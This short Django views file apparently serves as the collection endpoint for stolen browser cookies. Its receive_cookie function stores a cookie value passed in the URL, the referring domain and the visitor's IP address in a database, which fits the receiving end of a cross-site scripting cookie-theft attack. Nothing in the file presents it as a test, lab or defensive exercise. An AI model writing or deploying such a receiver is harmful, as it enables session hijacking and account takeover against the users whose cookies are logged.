from django.shortcuts import render

from django.http import HttpResponse
from receive.models import Cookie

# Create your views here.

def receive_cookie(request):
    '''
    Store cookie information in database
    '''

    # Get cookie and domain
    cookie = request.GET.get('cookie', 'None')
    domain = request.META.get('HTTP_REFERER', 'None')

    # Get real ip address
    if request.META.has_key('HTTP_X_FORWARDED_FOR'):
        ip =  request.META['HTTP_X_FORWARDED_FOR']
    else:
        ip = request.META['REMOTE_ADDR']

    # Store it if there isn't existed
    Cookie.objects.get_or_create(cookie=cookie, domain=domain, ip=ip)

    return HttpResponse('OK')
